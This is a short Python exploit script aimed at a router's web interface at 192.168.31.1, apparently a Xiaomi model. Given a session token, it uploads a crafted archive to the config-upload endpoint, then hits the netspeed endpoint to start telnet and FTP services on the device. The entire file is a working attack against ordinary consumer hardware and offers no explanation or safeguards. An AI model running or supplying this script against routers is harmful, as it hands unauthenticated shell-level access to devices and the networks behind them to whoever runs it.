import sys
import re
import time
import random
import hashlib
import requests
import socket
import subprocess

router_ip_address = "192.168.31.1"
router_ip_address = input("Router IP address [press enter for using the default {}]: ".format(router_ip_address)) or router_ip_address


# get stok
stok = input("stok: ")
# stok = "eeb59f33a51cd46649cd4ad1e3f50ecf"

print("****************")
print("router_ip_address: " + router_ip_address)
print("stok: " + stok)
print("****************")

print("start uploading config file...")
requests.post("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/misystem/c_upload".format(router_ip_address=router_ip_address,stok=stok), files={"image":open("data/main2.tar.gz",'rb')})

print("run telnet+ftpd...")
requests.get("http://{router_ip_address}/cgi-bin/luci/;stok={stok}/api/xqnetdetect/netspeed".format(router_ip_address=router_ip_address,stok=stok))
print("Done")
